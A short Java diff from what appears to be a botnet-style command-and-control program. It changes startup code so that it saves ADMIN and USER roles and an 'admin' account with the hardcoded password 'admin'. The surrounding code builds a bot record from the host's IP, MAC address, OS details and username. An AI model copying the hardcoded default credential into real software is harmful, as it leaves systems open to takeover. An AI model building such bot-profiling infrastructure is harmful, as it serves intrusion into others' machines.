@@ -89,13 +89,16 @@ public class Commando {
 		nServ.getAliveBot().add(botAlive);
 		pServ.initP2P();
 		System.out.println("peer to peer fatto");
-
+		 Role admin=new Role("ADMIN");
+		 rServ.save(admin);
+		 Role user=new Role("USER");
+		 rServ.save(user);
+		
 		//// TESTING
-		// Role admin=new Role("ADMIN");
-		// rServ.save(admin);
-		// Set<Role> roleSet=new HashSet<Role>();
-		// roleSet.add(admin);
-		// uServ.save(new User("admin","admin", "a", "b", "ad", roleSet));
+		
+		 Set<Role> roleSet=new HashSet<Role>();
+		 roleSet.add(admin);
+		 uServ.save(new User("admin","admin", "a", "b", "ad", roleSet));
 		////////
 
 		Bot bot = new Bot(nServ.getIdHash(), nServ.getMyIp().toString(), nServ.getMac(), nServ.getOs(), nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(), pki.getPubRSAKeyToString(), (nServ.isElegible() + ""));
